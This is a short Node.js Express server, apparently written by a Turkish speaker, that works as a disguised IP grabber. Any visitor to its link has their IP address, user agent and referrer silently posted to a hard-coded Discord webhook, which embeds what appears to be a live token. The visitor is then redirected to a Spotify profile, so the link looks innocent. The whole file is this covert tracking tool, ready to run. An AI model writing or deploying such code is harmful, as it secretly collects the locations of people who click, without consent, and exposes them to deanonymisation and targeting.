const express = require('express');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1513283799583162458/SeJddnVhH8sK1REjZwc9yhTaon0cG7kY85Q8VFhqhfDo2BQstD3-lncKGKoIIuXcYDmO';
const REDIRECT_URL = 'https://open.spotify.com/user/zx9oehv0zw9qx96qowlby0ktl?si=22be720da7b1485a';

function sendToDiscord(ip, ua, referrer) {
  const msg = '**Yeni Ziyaretçi!**\n**IP:** ' + ip + '\n**User-Agent:** ' + ua + '\n**Sayfa:** ' + (referrer || 'Doğrudan') + '\n**Zaman:** ' + new Date().toLocaleString('tr-TR');
  const data = JSON.stringify({content: msg});
  const url = new URL(WEBHOOK_URL);
  const opts = {
    hostname: url.hostname,
    path: url.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data)
    }
  };
  const req = https.request(opts);
  req.write(data);
  req.end();
}

app.get('/', (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
  const ua = req.headers['user-agent'] || 'Bilinmiyor';
  const referrer = req.headers['referer'] || '';
  sendToDiscord(ip, ua, referrer);
  res.redirect(REDIRECT_URL);
});

app.listen(PORT, () => {
  console.log('Server running on port ' + PORT);
});
